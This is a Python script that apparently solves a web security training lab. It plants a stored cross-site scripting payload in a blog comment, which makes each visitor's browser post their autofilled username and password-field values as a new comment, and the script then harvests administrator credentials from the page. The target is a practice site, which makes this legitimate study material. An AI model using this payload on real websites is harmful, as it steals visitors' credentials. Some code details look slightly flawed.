import requests
import sys
from bs4 import BeautifulSoup
import re
import time
site = 'ace01f381eb66095c0fe0cf7006b005b.web-security-academy.net'


s = requests.Session()
post_url = f'https://{site}/post?postId=2'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

# Need to register an event handler to ensure form element that contains csrf token is loaded
#   and accessible.  Then, need to pull it in to the form on the page before submitting it
#   Any visitor will execute script when visiting page
comment_url = f'https://{site}/post/comment'
comment_xss = ''''<script>                                
  document.addEventListener("DOMContentLoaded", function() { 
    document.forms[0].email.value='madler@pdx.edu';
    document.forms[0].name.value='madler';
    document.forms[0].comment.value=username.value+':'+this.value;
    document.forms[0].website='https://pdx.edu';
    document.forms[0].submit();
  });                                                                             
</script>'''
comment_data = {
    'csrf' : csrf,
    'postId' : '2',
    'comment' : comment_xss,
    'name' : 'MattAdler',
    'email' : 'madler@.edu',
    'website': 'https://pdx.edu'
}
resp = s.post(comment_url, data=comment_data)

s = requests.Session()
post_url = f'https://{site}/post?postId=1'
resp = s.post(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
print(soup)
credentials = soup.find('p', text=re.compile('administrator')).text.split(':')
